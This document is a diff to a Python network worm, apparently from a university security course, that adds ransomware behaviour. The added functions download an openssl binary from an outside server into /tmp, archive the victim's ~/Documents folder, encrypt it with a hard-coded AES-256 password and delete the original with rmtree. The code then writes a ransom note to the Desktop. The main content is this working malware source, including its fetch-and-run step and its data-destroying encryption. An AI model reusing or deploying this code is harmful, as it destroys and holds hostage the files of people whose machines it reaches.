@@ -11,7 +11,10 @@ import socket       # Handle socket connection
 import nmap         # Handle NMAP/port scanning
 import os           # Operating system command
 import netifaces    # Handle network interfaces
-from subprocess import call
+from subprocess import call # Allow running of another program
+import urllib       # To handle file download
+import tarfile      # Allow the creation of tar file
+import shutil       # Allow to execute shell command
 
 #===============================================================================
 # Define a set of global variables and marker files
@@ -38,6 +41,9 @@ if not WORM_NAME[0] == ".":
     WORM_NAME = "." + WORM_NAME
 
 WORM_DEST = "/tmp/" + WORM_NAME
+
+# Declare a variable to hold the full path to openssl
+OPENSSL = "/tmp/openssl"
 
 #===============================================================================
 # Define a set of support functions use by the worm
@@ -298,11 +304,121 @@ def spreadAndExecute(sshClient, fromHost):
         print msg
 
 #===============================================================================
+# Function to download openssl program from the net.
+# @param None
+# @return True if successfully download the file or False if failed
+#===============================================================================
+def downloadProgramFromNet():
+    # Create a variable to hold the URL to the openssl program
+    URL = "http://ecs.fullerton.edu/mgofman/openssl"
+    try:
+        # Download the URL above and save it to the path where OPENSSL defined
+        urllib.urlretrieve(URL, OPENSSL)
+        return True
+    except (IOError, urllib.ContentTooShortError) as msg:
+        print "downloadProgramFromNet function:"
+        print msg
+        return False
+
+#===============================================================================
+# Function to create a tar compression and Delete the original
+# @param directory - The directory that we want to compress and Delete
+#                    i.e: /home/cpsc/Documents/
+# @return tarName if successfully created or None if not
+#===============================================================================
+def compressEncryptDelete(directory):
+
+    tarName = ""
+
+    if os.path.exists(directory):
+        if not directory[-1] == "/":
+            directory += "/"
+
+        # Set a tar name to ~/<name>.tar
+        tarName = os.path.expanduser("~") + "/" + directory.split("/")[-2] + ".tar"
+    else:
+        print "compressEncryptDelete function:"
+        print "Path " + directory + " is not valid"
+        return None
+
+    # If we get here we will try to do things with the directory
+    if not tarName == "":
+        try:
+            # First we create a tar and compress the directory
+            # Open a tarfile for writing and gz compress
+            tar = tarfile.open(tarName, "w:gz")
+            # Add the directory to the archive
+            tar.add(directory)
+            # Close the tar file
+            tar.close()
+
+            # Then we encrypt it.  We need to change open ssl to execute
+            call(["chmod", "a+x", OPENSSL])
+
+            # Run the encryption
+            password = "cs456worm"
+            ARGS = [OPENSSL, "aes-256-cbc", "-a", "-salt", "-in", tarName, "-out"]
+            ARGS.append(tarName + ".enc")
+            ARGS.append("-k")
+            ARGS.append(password)
+
+            # Call the program to encrypt it
+            call(ARGS)
+
+            # Then we remove the directory
+            shutil.rmtree(directory)
+
+            # Finally we need to delete the tar file itself and only leave the
+            # encrypted file
+            os.remove(tarName)
+            return tarName + ".enc"
+
+        except OSError as msg:
+            print "compressEncryptDelete function:" + msg
+            return None
+        except shutil.Error as msg:
+            print "compressEncryptDelete function:" + msg
+            return None
+        except tarfile.TarError as msg:
+            print "compressEncryptDelete function: " + tarName + ": " + msg
+            return None
+
+    else:
+        print "compressEncryptDelete function:"
+        print "Not able to get tarName: " + tarName
+        return None
+
+#===============================================================================
+# Function to create a ransom note file
+# @param tarName - The encrypted tarName path
+# @return True if successfully leave a Ransom Note or False if not
+#===============================================================================
+def leaveRansomNote(tarName):
+    ransomFile = os.path.expanduser("~") + "/Desktop/ransomNote.txt"
+    try:
+        fileObj = open(ransomFile, "w")
+        fileObj.write("Your files had been pwned with encryption !")
+        fileObj.write("To get it back, you will need to purchase the key from moi")
+        fileObj.write("You must complete the following within 5 days !")
+        fileObj.write("Record yourself saying 'I love CPSC 456' 100 times")
+        fileObj.write("Attach the recorded file and email to getmykey@cpsc456.info")
+        fileObj.write("Once verify you will get the key to decrypt the files")
+        fileObj.write("Adios !")
+        fileObj.close()
+        return True
+    except IOError as msg:
+        print "leaveRansomNote function: " + msg
+        return False
+
+#===============================================================================
 # Perform malicious action
 # @param fromHost - Spread from Host
 #===============================================================================
 def performMalicious(fromHost):
-    #TODO: Write code here to perform what ever the malicious action is
+    # Compress the user Documents directory
+    docDir = os.path.expanduser("~") + "/Documents"
+    encryptedFile = None
+    # Mark the same thing as replicator worm
     try:
         outFile = open("/tmp/.attackedFrom.txt", "w")
         outFile.write("System was attacked from " + fromHost)
@@ -310,6 +426,22 @@ def performMalicious(fromHost):
     except IOError as msg:
         print "performMalicious function:"
         print msg
+
+    # Do the actual malicious acts
+    if downloadProgramFromNet() and os.path.exists(OPENSSL):
+        print "Successfully download openssl file"
+
+        # Encrypt the directory
+        encryptedFile = compressEncryptDelete(docDir)
+        if encryptedFile == None:
+            print "Something went wrong with extorting"
+        elif leaveRansomNote(encryptedFile):
+            print "Left a Message on Desktop"
+        else:
+            print "Something went wrong with leaving ransom note"
+
+    else:
+        print "Something went wrong getting openssl file"
 
 #===============================================================================
 # Main program start here
